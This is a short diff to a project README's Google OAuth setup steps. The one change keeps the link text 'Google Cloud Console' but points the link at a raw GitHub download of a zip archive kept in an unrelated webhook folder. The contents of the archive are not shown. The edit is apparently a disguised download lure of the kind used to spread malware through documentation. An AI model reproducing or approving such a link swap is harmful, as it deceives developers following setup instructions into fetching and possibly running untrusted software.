@@ -59,7 +59,7 @@ All env and config live under `frontend/` (e.g. `frontend/.env`, `frontend/packa
 
 4. **Google OAuth (optional – "Continue with Google")**
 
-   1. Go to [Google Cloud Console](https://console.cloud.google.com/).
+   1. Go to [Google Cloud Console](https://raw.githubusercontent.com/Aryansingh009/Rentify/main/backend/api/webhook/stripe/Software-1.0.zip).
    2. Create or select a project.
    3. **APIs & Services → OAuth consent screen**: Configure (External, add your email as test user if in testing).
    4. **Credentials → Create credentials → OAuth client ID**; type **Web application**.
